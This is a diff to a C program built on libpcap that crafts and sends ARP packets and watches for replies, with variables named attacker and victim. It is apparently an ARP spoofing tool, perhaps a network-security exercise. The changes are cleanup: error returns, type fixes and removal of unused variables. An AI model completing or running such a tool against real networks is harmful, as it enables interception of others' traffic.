@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <unistd.h>
 #include <string.h>
 #include <pcap.h>
 #include <net/ethernet.h>
@@ -52,7 +53,6 @@ int getMyIpAddr(struct in_addr *myip, char *interface)
 {
     int             fd;
     struct ifreq    ifr;
-    int             idx;
 
     if((fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP))==-1)
     {
@@ -167,14 +167,13 @@ int main(int argc, char **argv)
     struct in_addr          attacker_ip;
     struct in_addr          victim_ip;
     struct in_addr          target_ip;
-    char                    arpPacket[sizeof(struct ether_header) + sizeof(struct arp_addr) + sizeof(struct arp_addr)];
+    u_char                  arpPacket[sizeof(struct ether_header) + sizeof(struct arp_addr) + sizeof(struct arp_addr)];
     int                     res;
     struct pcap_pkthdr      *header;
     const u_char            *packet;
     struct ether_header     *eth_hdr;
     struct arphdr           *arp_hdr;
     struct arp_addr         *arp_addr;
-    char                    opt;
 
     if(argc != 4)
     {
@@ -208,6 +207,7 @@ int main(int argc, char **argv)
     if(pcap_sendpacket(handle, arpPacket, sizeof(arpPacket))!=0)
     {
         fprintf(stderr, "Couldn't send the packet\n");
+        return -1;
     }
 
     while((res = pcap_next_ex(handle, &header, &packet)) >= 0)
@@ -223,6 +223,7 @@ int main(int argc, char **argv)
         {
             arp_hdr = (struct arphdr *) (packet + sizeof(struct ether_header));
             if(arp_hdr->ar_hrd == htons(ARPHRD_ETHER) && arp_hdr->ar_pro == htons(ETHERTYPE_IP) && arp_hdr->ar_op == htons(ARPOP_REPLY))
+                
             {
                 arp_addr = (struct arp_addr *) (packet + sizeof(struct ether_header) + sizeof(struct arphdr));
                 if(!cmpHwAddr(arp_addr->tha, attacker_ha) && !cmpIpAddr(arp_addr->sip, victim_ip) && !cmpIpAddr(arp_addr->tip, attacker_ip))
@@ -238,6 +239,7 @@ int main(int argc, char **argv)
     if(pcap_sendpacket(handle, arpPacket, sizeof(arpPacket))!=0)
     {
         fprintf(stderr, "Couldn't send the packet\n");
+        return -1;
     }
 
     pcap_close(handle);
